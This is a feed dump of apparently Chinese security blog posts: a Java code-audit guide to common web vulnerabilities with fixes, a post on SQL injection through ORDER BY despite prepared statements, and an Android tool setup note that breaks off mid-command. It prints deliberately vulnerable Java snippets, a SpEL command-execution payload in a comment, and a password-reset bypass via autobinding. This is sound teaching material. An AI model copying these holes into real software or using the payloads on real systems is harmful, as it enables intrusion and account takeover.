class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> books <span class="keyword">where</span> <span class="keyword">id</span>= $&#123;<span class="keyword">id</span>&#125;</span><br></pre></td></tr></table></figure><p>对于Mybatis框架下SQL注入漏洞的审计可参考<a href="https://mp.weixin.qq.com/s?__biz=MjM5OTk2MTMxOQ==&mid=2727827368&idx=1&sn=765d0835f0069b5145523c31e8229850&mpshare=1&scene=1&srcid=0926a6QC3pGbQ3Pznszb4n2q" target="_blank" rel="noopener">Mybatis框架下SQL注入漏洞面面观</a></p><h3 id="修复方案-3"><a href="#修复方案-3" class="headerlink" title="修复方案"></a>修复方案</h3><p>Mybatis框架SQL语句安全写法应使用#{},避免使用动态拼接形式${}，ibatis则使用#变量#。安全写法如下:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> books <span class="keyword">where</span> <span class="keyword">id</span>= <span class="comment">#&#123;id&#125;</span></span><br></pre></td></tr></table></figure><h2 id="0x04-文件上传漏洞"><a href="#0x04-文件上传漏洞" class="headerlink" title="0x04 文件上传漏洞"></a>0x04 文件上传漏洞</h2><h3 id="介绍-4"><a href="#介绍-4" class="headerlink" title="介绍"></a>介绍</h3><p>文件上传过程中，通常因为未校验上传文件后缀类型，导致用户可上传jsp等一些webshell文件。代码审计时可重点关注对上传文件类型是否有足够安全的校验，以及是否限制文件大小等。</p><h3 id="漏洞示例-4"><a href="#漏洞示例-4" class="headerlink" title="漏洞示例"></a>漏洞示例</h3><p>此处以MultipartFile为例，示例代码片段如下:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">handleFileUpload</span><span class="params">(MultipartFile file)</span></span>&#123;</span><br><span class="line">    String fileName = file.getOriginalFilename();</span><br><span class="line">    <span class="keyword">if</span> (fileName==<span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"file is error"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    String filePath = <span class="string">"/static/images/uploads/"</span>+fileName;</span><br><span class="line">    <span class="keyword">if</span> (!file.isEmpty()) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">byte</span>[] bytes = file.getBytes();</span><br><span class="line">            BufferedOutputStream stream =</span><br><span class="line">                    <span class="keyword">new</span> BufferedOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="keyword">new</span> File(filePath)));</span><br><span class="line">            stream.write(bytes);</span><br><span class="line">            stream.close();</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"OK"</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">return</span> e.getMessage();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"You failed to upload "</span> + file.getOriginalFilename() + <span class="string">" because the file was empty."</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="审计函数-3"><a href="#审计函数-3" class="headerlink" title="审计函数"></a>审计函数</h3><p>java程序中涉及到文件上传的函数，比如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MultipartFile</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="修复方案-4"><a href="#修复方案-4" class="headerlink" title="修复方案"></a>修复方案</h3><ul><li>使用白名单校验上传文件类型、大小限制</li></ul><h2 id="0x05-Autobinding"><a href="#0x05-Autobinding" class="headerlink" title="0x05 Autobinding"></a>0x05 Autobinding</h2><h3 id="介绍-5"><a href="#介绍-5" class="headerlink" title="介绍"></a>介绍</h3><p>Autobinding-自动绑定漏洞，根据不同语言/框架，该漏洞有几个不同的叫法，如下：</p><ul><li>Mass Assignment: Ruby on Rails, NodeJS</li><li>Autobinding: Spring MVC, ASP.NET MVC</li><li>Object injection: PHP(对象注入、反序列化漏洞)</li></ul><p>软件框架有时允许开发人员自动将HTTP请求参数绑定到程序代码变量或对象中，从而使开发人员更容易地使用该框架。这里攻击者就可以利用这种方法通过构造http请求，将请求参数绑定到对象上，当代码逻辑使用该对象参数时就可能产生一些不可预料的结果。</p><h3 id="漏洞示例-5"><a href="#漏洞示例-5" class="headerlink" title="漏洞示例"></a>漏洞示例</h3><p>示例代码以<a href="https://github.com/GrrrDog/ZeroNights-HackQuest-2016" target="_blank" rel="noopener">ZeroNights-HackQuest-2016</a>的demo为例，把示例中的justiceleague程序运行起来，可以看到这个应用菜单栏有about，reg，Sign up，Forgot password这4个页面组成。我们关注的点是密码找回功能，即怎么样绕过安全问题验证并找回密码。</p><p>1）首先看reset方法，把不影响代码逻辑的删掉。这样更简洁易懂：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="meta">@SessionAttributes</span>(<span class="string">"user"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ResetPasswordController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> UserService userService;</span><br><span class="line">...</span><br><span class="line"><span class="meta">@RequestMapping</span>(value = <span class="string">"/reset"</span>, method = RequestMethod.POST)</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">resetHandler</span><span class="params">(@RequestParam String username, Model model)</span> </span>&#123;</span><br><span class="line">User user = userService.findByName(username);</span><br><span class="line"><span class="keyword">if</span> (user == <span class="keyword">null</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">"reset"</span>;</span><br><span class="line">&#125;</span><br><span class="line">model.addAttribute(<span class="string">"user"</span>, user);</span><br><span class="line"><span class="keyword">return</span> <span class="string">"redirect: resetQuestion"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里从参数获取username并检查有没有这个用户，如果有则把这个user对象放到Model中。因为这个Controller使用了@SessionAttributes(“user”)，所以同时也会自动把user对象放到session中。然后跳转到resetQuestion密码找回安全问题校验页面。</p><p>2）resetQuestion密码找回安全问题校验页面有resetViewQuestionHandler这个方法展现</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping</span>(value = <span class="string">"/resetQuestion"</span>, method = RequestMethod.GET)</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">resetViewQuestionHandler</span><span class="params">(@ModelAttribute User user)</span> </span>&#123;</span><br><span class="line">logger.info(<span class="string">"Welcome resetQuestion ! "</span> + user);</span><br><span class="line"><span class="keyword">return</span> <span class="string">"resetQuestion"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里使用了@ModelAttribute User user，实际上这里是从session中获取user对象。但存在问题是如果在请求中添加user对象的成员变量时则会更改user对象对应成员的值。<br>所以当我们给resetQuestionHandler发送GET请求的时候可以添加“answer=hehe”参数，这样就可以给session中的对象赋值，将原本密码找回的安全问题答案修改成“hehe”。这样在最后一步校验安全问题时即可验证成功并找回密码</p><h3 id="审计函数-4"><a href="#审计函数-4" class="headerlink" title="审计函数"></a>审计函数</h3><p>这种漏洞一般在比较多步骤的流程中出现，比如转账、找密等场景，也可重点留意几个注解如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@SessionAttributes</span><br><span class="line">@ModelAttribute</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>更多信息可参考<a href="https://xianzhi.aliyun.com/forum/topic/1089/" target="_blank" rel="noopener">Spring MVC Autobinding漏洞实例初窥</a></p><h3 id="修复方案-5"><a href="#修复方案-5" class="headerlink" title="修复方案"></a>修复方案</h3><p>Spring MVC中可以使用@InitBinder注解，通过WebDataBinder的方法setAllowedFields、setDisallowedFields设置允许或不允许绑定的参数。</p><h2 id="0x06-URL重定向"><a href="#0x06-URL重定向" class="headerlink" title="0x06 URL重定向"></a>0x06 URL重定向</h2><h3 id="介绍-6"><a href="#介绍-6" class="headerlink" title="介绍"></a>介绍</h3><p>由于Web站点有时需要根据不同的逻辑将用户引向到不同的页面，如典型的登录接口就经常需要在认证成功之后将用户引导到登录之前的页面，整个过程中如果实现不好就可能导致URL重定向问题，攻击者构造恶意跳转的链接，可以向用户发起钓鱼攻击。</p><h3 id="漏洞示例-6"><a href="#漏洞示例-6" class="headerlink" title="漏洞示例"></a>漏洞示例</h3><p>此处以Servlet的redirect 方式为例，示例代码片段如下:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">String site = request.getParameter(<span class="string">"url"</span>);</span><br><span class="line"><span class="keyword">if</span>(!site.isEmpty())&#123;</span><br><span class="line">response.sendRedirect(site);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="审计函数-5"><a href="#审计函数-5" class="headerlink" title="审计函数"></a>审计函数</h3><p>java程序中URL重定向的方法均可留意是否对跳转地址进行校验、重定向函数如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sendRedirect</span><br><span class="line">setHeader</span><br><span class="line">forward</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="修复方案-6"><a href="#修复方案-6" class="headerlink" title="修复方案"></a>修复方案</h3><ul><li>使用白名单校验重定向的url地址</li><li>给用户展示安全风险提示，并由用户再次确认是否跳转</li></ul><h2 id="0x07-CSRF"><a href="#0x07-CSRF" class="headerlink" title="0x07 CSRF"></a>0x07 CSRF</h2><h3 id="介绍-7"><a href="#介绍-7" class="headerlink" title="介绍"></a>介绍</h3><p>跨站请求伪造（Cross-Site Request Forgery，CSRF）是一种使已登录用户在不知情的情况下执行某种动作的攻击。因为攻击者看不到伪造请求的响应结果，所以CSRF攻击主要用来执行动作，而非窃取用户数据。当受害者是一个普通用户时，CSRF可以实现在其不知情的情况下转移用户资金、发送邮件等操作；但是如果受害者是一个具有管理员权限的用户时CSRF则可能威胁到整个Web系统的安全。</p><h3 id="漏洞示例-7"><a href="#漏洞示例-7" class="headerlink" title="漏洞示例"></a>漏洞示例</h3><p>由于开发人员对CSRF的了解不足，错把“经过认证的浏览器发起的请求”当成“经过认证的用户发起的请求”，当已认证的用户点击攻击者构造的恶意链接后就“被”执行了相应的操作。例如，一个博客删除文章是通过如下方式实现的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET http://blog.com/article/delete.jsp?id=102</span><br></pre></td></tr></table></figure><p>当攻击者诱导用户点击下面的链接时，如果该用户登录博客网站的凭证尚未过期，那么他便在不知情的情况下删除了id为102的文章，简单的身份验证只能保证请求发自某个用户的浏览器，却不能保证请求本身是用户自愿发出的。</p><h3 id="漏洞审计"><a href="#漏洞审计" class="headerlink" title="漏洞审计"></a>漏洞审计</h3><p>此类漏洞一般都会在框架中解决修复，所以在审计csrf漏洞时。首先要熟悉框架对CSRF的防护方案，一般审计时可查看增删改请求重是否有token、formtoken等关键字以及是否有对请求的Referer有进行校验。手动测试时,如果有token等关键则替换token值为自定义值并重放请求，如果没有则替换请求Referer头为自定义链接或置空。重放请求看是否可以成功返回数据从而判断是否存在CSRF漏洞。</p><h3 id="修复方案-7"><a href="#修复方案-7" class="headerlink" title="修复方案"></a>修复方案</h3><ul><li>Referer校验，对HTTP请求的Referer校验，如果请求Referer的地址不在允许的列表中，则拦截请求。</li><li>Token校验，服务端生成随机token，并保存在本次会话cookie中，用户发起请求时附带token参数，服务端对该随机数进行校验。如果不正确则认为该请求为伪造请求拒绝该请求。</li><li>Formtoken校验，Formtoken校验本身也是Token校验，只是在本次表单请求有效。</li><li>对于高安全性操作则可使用验证码、短信、密码等二次校验措施</li><li>增删改请求使用POST请求</li></ul><h2 id="0x08-命令执行"><a href="#0x08-命令执行" class="headerlink" title="0x08 命令执行"></a>0x08 命令执行</h2><h3 id="介绍-8"><a href="#介绍-8" class="headerlink" title="介绍"></a>介绍</h3><p>由于业务需求，程序有可能要执行系统命令的功能，但如果执行的命令用户可控，业务上有没有做好限制，就可能出现命令执行漏洞。</p><h3 id="漏洞示例-8"><a href="#漏洞示例-8" class="headerlink" title="漏洞示例"></a>漏洞示例</h3><p>此处以getRuntime为例，示例代码片段如下:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String cmd = request.getParameter(<span class="string">"cmd"</span>);</span><br><span class="line">Runtime.getRuntime().exec(cmd);</span><br></pre></td></tr></table></figure><h3 id="审计函数-6"><a href="#审计函数-6" class="headerlink" title="审计函数"></a>审计函数</h3><p>这种漏洞原理上很简单，重点是找到执行系统命令的函数，看命令是否可控。在一些特殊的业务场景是能判断出是否存在此类功能，这里举个典型的实例场景,有的程序功能需求提供网页截图功能，笔者见过多数是使用phantomjs实现，那势必是需要调用系统命令执行phantomjs并传参实现截图。而参数大多数情况下应该是当前url或其中获取相关参数，此时很有可能存在命令执行漏洞，还有一些其它比较特别的场景可自行脑洞。</p><p>java程序中执行系统命令的函数如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Runtime.exec</span><br><span class="line">ProcessBuilder.start</span><br><span class="line">GroovyShell.evaluate</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="修复方案-8"><a href="#修复方案-8" class="headerlink" title="修复方案"></a>修复方案</h3><ul><li>避免命令用户可控</li><li>如需用户输入参数，则对用户输入做严格校验，如&amp;&amp;、|、;等</li></ul><h2 id="0x09-权限控制"><a href="#0x09-权限控制" class="headerlink" title="0x09 权限控制"></a>0x09 权限控制</h2><h3 id="介绍-9"><a href="#介绍-9" class="headerlink" title="介绍"></a>介绍</h3><p>越权漏洞可以分为水平、垂直越权两种,程序在处理用户请求时未对用户的权限进行校验，使的用户可访问、操作其他相同角色用户的数据，这种情况是水平越权；如果低权限用户可访问、操作高权限用户则的数据，这种情况为垂直越权。</p><h3 id="漏洞示例-9"><a href="#漏洞示例-9" class="headerlink" title="漏洞示例"></a>漏洞示例</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping</span>(value=<span class="string">"/getUserInfo"</span>,method = RequestMethod.GET)</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getUserInfo</span><span class="params">(Model model, HttpServletRequest request)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    String userid = request.getParameter(<span class="string">"userid"</span>);</span><br><span class="line">    <span class="keyword">if</span>(!userid.isEmpty())&#123;</span><br><span class="line">        String info=userModel.getuserInfoByid(userid);</span><br><span class="line">        <span class="keyword">return</span> info;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">""</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="审计函数-7"><a href="#审计函数-7" class="headerlink" title="审计函数"></a>审计函数</h3><p>水平、垂直越权不需关注特定函数，只要在处理用户操作请求时查看是否有对当前登陆用户权限做校验从而确定是否存在漏洞</p><h3 id="修复方案-9"><a href="#修复方案-9" class="headerlink" title="修复方案"></a>修复方案</h3><p>获取当前登陆用户并校验该用户是否具有当前操作权限，并校验请求操作数据是否属于当前登陆用户，当前登陆用户标识不能从用户可控的请求参数中获取。</p><h2 id="0x10-批量请求"><a href="#0x10-批量请求" class="headerlink" title="0x10 批量请求"></a>0x10 批量请求</h2><h3 id="介绍-10"><a href="#介绍-10" class="headerlink" title="介绍"></a>介绍</h3><p>业务中经常会有使用到发送短信校验码、短信通知、邮件通知等一些功能，这类请求如果不做任何限制，恶意攻击者可能进行批量恶意请求轰炸，大量短信、邮件等通知对正常用户造成困扰，同时也是对公司的资源造成损耗。</p><p>除了短信、邮件轰炸等，还有一种情况也需要注意，程序中可能存在很多接口，用来查询账号是否存在、账号名与手机或邮箱、姓名等的匹配关系，这类请求如不做限制也会被恶意用户批量利用，从而获取用户数据关系相关数据。对这类请求在代码审计时可关注是否有对请求做鉴权、和限制即可大致判断是否存在风险。</p><h3 id="漏洞示例-10"><a href="#漏洞示例-10" class="headerlink" title="漏洞示例"></a>漏洞示例</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping</span>(value=<span class="string">"/ifUserExit"</span>,method = RequestMethod.GET)</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">ifUserExit</span><span class="params">(Model model, HttpServletRequest request)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    String phone = request.getParameter(<span class="string">"phone"</span>);</span><br><span class="line">    <span class="keyword">if</span>(! phone.isEmpty())&#123;</span><br><span class="line">        <span class="keyword">boolean</span> ifex=userModel.ifuserExitByPhone(phone);</span><br><span class="line">        <span class="keyword">if</span> (!ifex)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"用户不存在"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"用户已被注册"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="修复方案-10"><a href="#修复方案-10" class="headerlink" title="修复方案"></a>修复方案</h3><ul><li>对同一个用户发起这类请求的频率、每小时及每天发送量在服务端做限制，不可在前端实现限制</li></ul><h2 id="0x11-第三方组件安全"><a href="#0x11-第三方组件安全" class="headerlink" title="0x11 第三方组件安全"></a>0x11 第三方组件安全</h2><h3 id="介绍-11"><a href="#介绍-11" class="headerlink" title="介绍"></a>介绍</h3><p>这个比较好理解，诸如Struts2、不安全的编辑控件、XML解析器以及可被其它漏洞利用的如commons-collections:3.1等第三方组件，这个可以在程序pom文件中查看是否有引入依赖。即便在代码中没有应用到或很难直接利用，也不应该使用不安全的版本，一个产品的周期很长，很难保证后面不会引入可被利用的漏洞点。</p><h3 id="修复方案-11"><a href="#修复方案-11" class="headerlink" title="修复方案"></a>修复方案</h3><ul><li>使用最新或安全版本的第三方组件</li></ul><h2 id="0x12-SPel注入"><a href="#0x12-SPel注入" class="headerlink" title="0x12 SPel注入"></a>0x12 SPel注入</h2><h3 id="介绍-12"><a href="#介绍-12" class="headerlink" title="介绍"></a>介绍</h3><p>Spel是Spring框架el表达式的缩写，当使用SpelExpressionParser解析spel表达式，且表达式可被外部控制，则可能导致SPel表达式注入从而造成RCE，如<a href="https://github.com/Cryin/Paper/blob/master/CVE-2018-1260%20spring-security-oauth2%20RCE%20Analysis.md" target="_blank" rel="noopener">CVE-2018-1260</a>就是spring-security-oauth2的一个SPel注入导致的RCE 。</p><h3 id="漏洞示例-11"><a href="#漏洞示例-11" class="headerlink" title="漏洞示例"></a>漏洞示例</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping</span>(path = <span class="string">"/elinjection"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SPelInjectionController</span> </span>&#123;</span><br><span class="line">    <span class="meta">@RequestMapping</span>(value=<span class="string">"/spel.html"</span>,method= RequestMethod.GET)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">SPelInjection</span><span class="params">(ModelMap modelMap, HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        String el=request.getParameter(<span class="string">"el"</span>);</span><br><span class="line">        <span class="comment">//el="T(java.lang.Runtime).getRuntime().exec(\"open /Applications/Calculator.app\")";</span></span><br><span class="line">        ExpressionParser PARSER = <span class="keyword">new</span> SpelExpressionParser();</span><br><span class="line">        Expression exp = PARSER.parseExpression(el);</span><br><span class="line">        <span class="keyword">return</span> (String)exp.getValue();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="修复方案-12"><a href="#修复方案-12" class="headerlink" title="修复方案"></a>修复方案</h3><ul><li>解析el表达式时，参数不要由外部用户输入</li></ul><h2 id="0x13-总结"><a href="#0x13-总结" class="headerlink" title="0x13 总结"></a>0x13 总结</h2><p>除了上述相关的漏洞，在代码审计的时候有时会遇到一些特别的漏洞，比如开发为了测试方便关闭掉了一些安全校验函数、甚至未彻底清除的一些预留后门及测试管理接口等。除此，框架本身的安全问题也是可以深挖。一些安全校验、安全解决方案也未必就毫无破绽的，即便存在一些安全解决，但开发人员有没有使用以及是否正确使用安全方案都是可能存在问题的点。大公司都有成熟的框架，一些基本的安全问题并不是太多，但设计层面上的安全及流程相关的问题却基本依赖开发的经验。流程相关的漏洞则有必要先熟悉应用本身的设计和逻辑，这块也是潜在的风险点。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Java敏感函数&quot;&gt;&lt;a href=&quot;#Java敏感函数&quot; class=&quot;headerlink&quot; title=&quot;Java敏感函数&quot;&gt;&lt;/a&gt;Java敏感函数&lt;/h1&gt;&lt;p&gt;因为最近开发插件见到了很多敏感函数，记录记录。&lt;/p&gt;
&lt;h2 id=&quot;0x00-XXE&quot;&gt;
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bai-ren-1.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>SQL预编译失效</title>
    <link href="http://bai-ren-1.github.io/2020/07/16/SQL%E9%A2%84%E7%BC%96%E8%AF%91%E5%A4%B1%E6%95%88/"/>
    <id>http://bai-ren-1.github.io/2020/07/16/SQL%E9%A2%84%E7%BC%96%E8%AF%91%E5%A4%B1%E6%95%88/</id>
    <published>2020-07-16T12:51:53.000Z</published>
    <updated>2020-07-16T13:27:44.875Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SQL预编译失效"><a href="#SQL预编译失效" class="headerlink" title="SQL预编译失效"></a>SQL预编译失效</h1><p>之前写了一篇《SQL预编译绕过》，其实这篇也没啥。只是提一下在某些特殊情况下，模板语句处理的不好其实也是会导致即使使用了预编译也会导致SQL注入的。</p><h2 id="0x00-动态拼接"><a href="#0x00-动态拼接" class="headerlink" title="0x00 动态拼接"></a>0x00 动态拼接</h2><p>语句参数是动态拼接的话，其实用不用SQL预编译都一个样：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">直接拼接（不安全的写法）</span><br><span class="line">String sql = &quot;select * from product where pname = &quot; + name;</span><br></pre></td></tr></table></figure><p>正确的做法是要进行参数绑定啦：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">参数绑定（安全的写法）</span><br><span class="line">String sql = &quot;select * from db_user where username = ?&quot;;</span><br><span class="line">PreparedStatement stmt = connection.prepareStatement(sql);</span><br><span class="line">stmt.setString(1,name);</span><br><span class="line">ResultSet rs = stmt.executeQuery();</span><br></pre></td></tr></table></figure><h2 id="0x01-order-by"><a href="#0x01-order-by" class="headerlink" title="0x01 order by"></a>0x01 order by</h2><p>order by 后面的语句，是不能够用<strong>预编译进行处理</strong>的，只能通过拼接进行操作，因此需要手动过滤：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">String sql = &quot;select * from userinfo where id = ? &quot;+&quot;order by &apos;&apos;&quot; + age + &quot;&apos; asc&apos;&quot; ;</span><br><span class="line">ps = conn.prepareStatement(sql);</span><br><span class="line">ps.setInt(1,id);</span><br><span class="line">rs = ps.executeQuery();</span><br></pre></td></tr></table></figure><p>所以假如上面没有对order by 的参数age进行过滤的话，就会照成SQL注入。</p><blockquote><p>所以渗透中看到sort等参数就很大可能存在SQL注入。</p></blockquote><p>order by后面不能参数绑定的原因：</p><ul><li>预编译又只有自动加引号的setString()方法，没有不加引号的方法；</li><li>order by后接的字段名不能有引号；</li></ul><p>所以如果order by后面的参数使用动态绑定，就会因为引号问题报语法错误。所以order by后面只能以动态拼接的方式来执行，但是很多傻逼开发不知道怎么过滤或者根本不知道得过滤，就导致一抓一个准。</p><h2 id="0x02-思考"><a href="#0x02-思考" class="headerlink" title="0x02 思考"></a>0x02 思考</h2><p>其实吧，结合上一篇总结起来，使用SQL预编译还会造成SQL注入就两个本质：</p><ul><li>模板使用了参数动态拼接，而不是参数绑定：这种情况分两种，第一种是开发是傻逼；第二种是上面的order by这种情况，不得不用动态拼接而他又没做好过滤。</li><li>没有配置好参数和编码，导致可以GBK宽字节绕过：详情看上一篇文章。</li></ul><h2 id="0x03-小结"><a href="#0x03-小结" class="headerlink" title="0x03 小结"></a>0x03 小结</h2><p>就写一下，因为很久没写了，很简单的问题。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;SQL预编译失效&quot;&gt;&lt;a href=&quot;#SQL预编译失效&quot; class=&quot;headerlink&quot; title=&quot;SQL预编译失效&quot;&gt;&lt;/a&gt;SQL预编译失效&lt;/h1&gt;&lt;p&gt;之前写了一篇《SQL预编译绕过》，其实这篇也没啥。只是提一下在某些特殊情况下，模板语句处理的
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bai-ren-1.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>AndroidKiller配置</title>
    <link href="http://bai-ren-1.github.io/2020/06/29/AndroidKiller%E9%85%8D%E7%BD%AE/"/>
    <id>http://bai-ren-1.github.io/2020/06/29/AndroidKiller%E9%85%8D%E7%BD%AE/</id>
    <published>2020-06-29T14:49:16.000Z</published>
    <updated>2020-06-29T15:23:19.579Z</updated>
    
    <content type="html"><![CDATA[<h1 id="AndroidKiller配置"><a href="#AndroidKiller配置" class="headerlink" title="AndroidKiller配置"></a>AndroidKiller配置</h1><p>AndroidKiller挺老了，但是用了下真的好方便，加上一些配置后感觉老廉颇了。所以记录一下，后面为了方便我都叫他AK。先贴上吾爱上的工具改造参考贴：<a href="https://www.52pojie.cn/thread-726176-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-726176-1-1.html</a> ，改造的过程根据帖子实现即可。</p><h2 id="0x00-AK连接夜神"><a href="#0x00-AK连接夜神" class="headerlink" title="0x00 AK连接夜神"></a>0x00 AK连接夜神</h2><p>记录一下AK如何通过adb连接到夜神模拟器上。首先我们开启夜神模拟器，然后通过pid号获取到它的端口：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wmic process where (name like &apos;%%Nox.exe%%&apos;) get processid /value</span><br><span class="line">netstat -ano | findstr 11308 | findstr LISTENING</span><br></pre></td></tr></table></figure><blockquote><p>这里获取进程号是直接使用wmic实现的，但也可以手动去任务管理器中找到夜神模拟器的进程号。然后在第二条命令中，将夜神模拟器的进程号替换在第一个管道符后的findstr后即可找到夜神的监听端口号，这里找到的pid是11308。</p></blockquote><p><img src="/2020/06/29/AndroidKiller%E9%85%8D%E7%BD%AE/1.png" alt></p><p>上图中我们可以找到夜神模拟器的监听端口是26966。然后我们进入到AK的目录，使用AK中的adb的命令连接到刚才我们找到的夜神模拟器的监听端口上：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd E:\AndroidKiller\bin\adb</span><br><span class="line">adb.exe connect 